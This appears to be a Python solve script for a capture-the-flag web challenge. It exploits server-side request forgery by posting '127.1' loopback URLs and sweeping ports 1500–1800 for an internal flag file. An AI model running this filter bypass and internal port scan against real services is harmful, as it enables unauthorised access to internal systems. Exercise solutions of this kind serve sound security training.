import requests
from bs4 import BeautifulSoup

class Solution:
    def __init__(self):
        self.req = requests.session()
        self.url = ""#server url include port
        self.res = ""
    def sendP(self, data):
        self.res = self.req.post(url=self.url, data=data)
    def checkSuc(self, res):
        if res.status_code == 200:
            bhtml = BeautifulSoup(res.text, "html.parser")
            par = bhtml.select('img')
            return par[0]['src']
        return False
    
if __name__ == '__main__':
    sol = Solution()
    url = "http://127.1:1500/app/flag.txt"
    sol.sendP({'url':url})
    out = sol.checkSuc(sol.res)
    print(out)
    spec = out
    for i in range(1500, 1801):
        url = "http://127.1:"+str(i)+"/app/flag.txt"
        sol.sendP({'url':url})
        print(url)
        out = sol.checkSuc(sol.res)
        if spec != out:
            print('find!!\nPORT: ' + str(i))
            break
